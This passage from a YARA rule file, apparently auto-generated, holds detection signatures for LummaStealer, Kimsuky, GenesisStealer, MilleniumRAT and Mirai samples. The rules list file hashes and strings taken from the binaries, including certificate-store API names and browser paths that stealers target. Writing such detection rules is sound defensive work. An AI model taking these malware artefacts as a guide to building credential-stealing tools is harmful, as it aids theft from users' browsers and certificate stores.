      $s15 = "GetSysteH" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 29000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Kimsuky_signature__b66e456457142424c4274ccc4a6e3326_imphash__LummaStealer_signature__4035d2883e01d64f3e7a9dccb1d63af5_impha_64 {
   meta:
      description = "_subset_batch - from files Kimsuky(signature)_b66e456457142424c4274ccc4a6e3326(imphash).exe, LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash)_34a2697f.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_d20503a6.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_ea37de23.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "84f4f2e77b6e59c1fe54360842821fbfc6cdab039f197147b30876ed7da3647c"
      hash2 = "8297cd00e6dd7a00a075bcb618e9864632fe1aeca0f15cd630f1e7d665d262b2"
      hash3 = "34a2697f63fe5c7752c039edbc7acae72858be60ff3e13b0109872bca01f4809"
      hash4 = "f37b9940d7ab8158b62bd0ca600cde35dffc36d64f5820931de7da9626fbe478"
      hash5 = "d20503a6c683c4cfddc10051531db2ab1b43be7d1b786d71f65938ce84812bbe"
      hash6 = "ea37de23a99f57a12361c094bfedc9cb91356f1d729a313ae68fcb86febf5701"
   strings:
      $s1 = "runtime.headTailIndex.head" fullword ascii /* score: '15.00'*/
      $s2 = "runtime.headTailIndex.split" fullword ascii /* score: '15.00'*/
      $s3 = "runtime.offAddr.sub" fullword ascii /* score: '13.00'*/
      $s4 = "runtime.(*headTailIndex).load" fullword ascii /* score: '12.00'*/
      $s5 = "runtime.(*headTailIndex).reset" fullword ascii /* score: '12.00'*/
      $s6 = "runtime.(*headTailIndex).incTail" fullword ascii /* score: '12.00'*/
      $s7 = "runtime.(*headTailIndex).cas" fullword ascii /* score: '11.00'*/
      $s8 = "syscall.getSystemDirectory" fullword ascii /* score: '11.00'*/
      $s9 = "runtime.addrRange.removeGreaterEqual" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.usleep2HighRes" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.updateTimerModifiedEarliest" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.updateTimerPMask" fullword ascii /* score: '10.00'*/
      $s13 = "type..eq.runtime.errorAddressString" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 29000KB and ( 8 of them )
      ) or ( all of them )
}

rule _LummaStealer_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__LummaStealer_signature__4035d2883e01d64f3e7a9dccb1d63af5__65 {
   meta:
      description = "_subset_batch - from files LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash)_34a2697f.exe, LummaStealer(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, LummaStealer(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash)_1d9bd7df.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_d20503a6.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_ea37de23.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8297cd00e6dd7a00a075bcb618e9864632fe1aeca0f15cd630f1e7d665d262b2"
      hash2 = "34a2697f63fe5c7752c039edbc7acae72858be60ff3e13b0109872bca01f4809"
      hash3 = "bde9b8b30e8700d3c2759ef0792a3d556063e78670ee31ef19676e5a1a1861cf"
      hash4 = "1d9bd7dfac193a4dfab75e59091f93b2a46232a7a461a6af02b0dddb0b509346"
      hash5 = "d20503a6c683c4cfddc10051531db2ab1b43be7d1b786d71f65938ce84812bbe"
      hash6 = "ea37de23a99f57a12361c094bfedc9cb91356f1d729a313ae68fcb86febf5701"
   strings:
      $s1 = "CertEnumCertificatesInStoreG waiting list is corruptedaddress not a stack addresschannel number out of rangecommunication error " ascii /* score: '25.00'*/
      $s2 = "garbage collection scangcDrain phase incorrectindex out of range [%x]interrupted system callinvalid m->lockedInt = left over mar" ascii /* score: '24.00'*/
      $s3 = "= flushGen  gfreecnt= pages at  runqsize= runqueue= s.base()= spinning= stopwait= sweepgen  sweepgen= targetpc= throwing= until " ascii /* score: '24.00'*/
      $s4 = "sweep: bad span statenot a XENIX named type fileprogToPointerMask: overflowrunlock of unlocked rwmutexruntime: asyncPreemptStack" ascii /* score: '23.00'*/
      $s5 = " to unallocated spanCertOpenSystemStoreWCreateProcessAsUserWCryptAcquireContextWGetAcceptExSockaddrsGetCurrentDirectoryWGetFileA" ascii /* score: '19.00'*/
      $s6 = "kroot jobsmakechan: bad alignmentnanotime returning zerono space left on deviceoperation not permittedoperation not supportedpan" ascii /* score: '15.00'*/
      $s7 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnableunexpected f" ascii /* score: '14.00'*/
      $s8 = "sched={pc: but progSize  nmidlelocked= out of range  procedure in  untyped args -thread limit" fullword ascii /* score: '11.00'*/
      $s9 = "ault address CertFreeCertificateContextGODEBUG: can not disable \"GetFileInformationByHandlePostQueuedCompletionStatusQueryPerfo" ascii /* score: '11.00'*/
      $s10 = " failedruntime: s.allocCount= s.allocCount > s.nelemsschedule: holding locksshrinkstack at bad timespan has no free stacksstack " ascii /* score: '10.00'*/
      $s11 = "=runtime: checkdead: find g runtime: checkdead: nmidle=runtime: netpollinit failedruntime: thread ID overflowruntime" fullword ascii /* score: '10.00'*/
      $s12 = "t.bpbad use of bucket.mpchan send (nil chan)close of nil channelconnection timed outdodeltimer0: wrong Pfloating point errorforc" ascii /* score: '10.00'*/
      $s13 = "CertEnumCertificatesInStoreG waiting list is corruptedaddress not a stack addresschannel number out of rangecommunication error " ascii /* score: '9.00'*/
      $s14 = "growth after forksystem huge page size (work.nwait > work.nprocCertFreeCertificateChainCreateToolhelp32SnapshotGetSystemTimeAsFi" ascii /* score: '8.00'*/
      $s15 = "CreateDirectoryWDnsNameCompare_WFlushFileBuffersGC scavenge waitGC worker (idle)GODEBUG: value \"GetComputerNameWGetFullPathName" ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and ( 8 of them )
      ) or ( all of them )
}

rule _GenesisStealer_signature__1d8915c3554f512929a8d501df563d33_imphash__MilleniumRAT_signature__bfc94987b9a21a61fae666713d43daf_66 {
   meta:
      description = "_subset_batch - from files GenesisStealer(signature)_1d8915c3554f512929a8d501df563d33(imphash).exe, MilleniumRAT(signature)_bfc94987b9a21a61fae666713d43dafc(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "944b2b3fc5d769e1edd6d9f0790692fa45adbee43d2d1687792246e7e84f3f63"
      hash2 = "73607f1799be5facd81d484fa6b1f6518378037ef16c32eaa0c562ff49c1e0b5"
   strings:
      $s1 = "brave.exe" fullword wide /* score: '22.00'*/
      $s2 = "msedge.exe" fullword wide /* score: '22.00'*/
      $s3 = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" fullword wide /* score: '17.00'*/
      $s4 = "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe" fullword wide /* score: '17.00'*/
      $s5 = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" fullword wide /* score: '17.00'*/
      $s6 = "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe" fullword wide /* score: '17.00'*/
      $s7 = "C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe" fullword wide /* score: '17.00'*/
      $s8 = "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe" fullword wide /* score: '17.00'*/
      $s9 = "\\Google\\Chrome\\Application\\chrome.exe" fullword wide /* score: '12.00'*/
      $s10 = "\\BraveSoftware\\Brave-Browser\\Application\\brave.exe" fullword wide /* score: '12.00'*/
      $s11 = "\\Microsoft\\Edge\\Application\\msedge.exe" fullword wide /* score: '12.00'*/
      $s12 = ".?AVfilesystem_error@filesystem@std@@" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Kimsuky_signature__b66e456457142424c4274ccc4a6e3326_imphash__LummaStealer_signature__1aae8bf580c846f39c71c05898e57e88_impha_67 {
   meta:
      description = "_subset_batch - from files Kimsuky(signature)_b66e456457142424c4274ccc4a6e3326(imphash).exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash).exe, LummaStealer(signature)_1aae8bf580c846f39c71c05898e57e88(imphash)_1f8a0a52.exe, LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, LummaStealer(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash)_34a2697f.exe, LummaStealer(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, LummaStealer(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash)_1d9bd7df.exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_93b67e92.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_d20503a6.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_ea37de23.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "84f4f2e77b6e59c1fe54360842821fbfc6cdab039f197147b30876ed7da3647c"
      hash2 = "ec1bf2523cc8eedddae9d7d4c657f210886b9f4cb085858310d97be8dd90b33f"
      hash3 = "1f8a0a528ce10785f929770fd9b1a3bb4d02f9f187ec0f7aab701b7a252c7099"
      hash4 = "8297cd00e6dd7a00a075bcb618e9864632fe1aeca0f15cd630f1e7d665d262b2"
      hash5 = "34a2697f63fe5c7752c039edbc7acae72858be60ff3e13b0109872bca01f4809"
      hash6 = "bde9b8b30e8700d3c2759ef0792a3d556063e78670ee31ef19676e5a1a1861cf"
      hash7 = "1d9bd7dfac193a4dfab75e59091f93b2a46232a7a461a6af02b0dddb0b509346"
      hash8 = "852fd8e572f18ab2f694153a8943c2ef198c2a5bf6179e7bef30c6dc79f84811"
      hash9 = "93b67e925e2b9bfe548c1437a40bc558b2b598f5f9c40c34c7c372814e8b89f4"
      hash10 = "f37b9940d7ab8158b62bd0ca600cde35dffc36d64f5820931de7da9626fbe478"
      hash11 = "d20503a6c683c4cfddc10051531db2ab1b43be7d1b786d71f65938ce84812bbe"
      hash12 = "ea37de23a99f57a12361c094bfedc9cb91356f1d729a313ae68fcb86febf5701"
   strings:
      $s1 = "runtime.dumpregs" fullword ascii /* score: '20.00'*/
      $s2 = "runtime.dumpgstatus" fullword ascii /* score: '20.00'*/
      $s3 = "runtime.printcomplex" fullword ascii /* score: '13.00'*/
      $s4 = "runtime.throw" fullword ascii /* score: '10.00'*/
      $s5 = "runtime.panicfloat" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.throw.func1" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.panicoverflow" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.fmtNSAsMS" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.printslice" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.itoaDiv" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.panicmem" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.printfloat" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.exitThread" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.fatalthrow" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.checkmcount" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 29000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__00f343a5_Mirai_signature__0e6e69c5_68 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_00f343a5.elf, Mirai(signature)_0e6e69c5.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "00f343a5aaca34f5fc4ea4e75ea67805d998cd590f93b942f0f323da729335d0"
      hash2 = "0e6e69c562067d0dc424bf3aad11d009131f25a093ec97ee7b071c6ff47406f8"
   strings:
      $s1 = "(condi/maps) Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s2 = "(condi/exe) Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s3 = "GET /index.html HTTP/1.1" fullword ascii /* score: '16.00'*/
      $s4 = "POST /api/data HTTP/1.1" fullword ascii /* score: '16.00'*/
      $s5 = "PUT /upload HTTP/1.1" fullword ascii /* score: '13.00'*/
      $s6 = "getchallenge steam" fullword ascii /* score: '11.00'*/
      $s7 = "DELETE /resource HTTP/1.1" fullword ascii /* score: '11.00'*/
      $s8 = "OPTIONS * HTTP/1.1" fullword ascii /* score: '11.00'*/
      $s9 = "Access-Control-Request-Method: GET" fullword ascii /* score: '9.00'*/
      $s10 = "Max-Forwards: 10" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and ( all of them )
      ) or ( all of them )
}

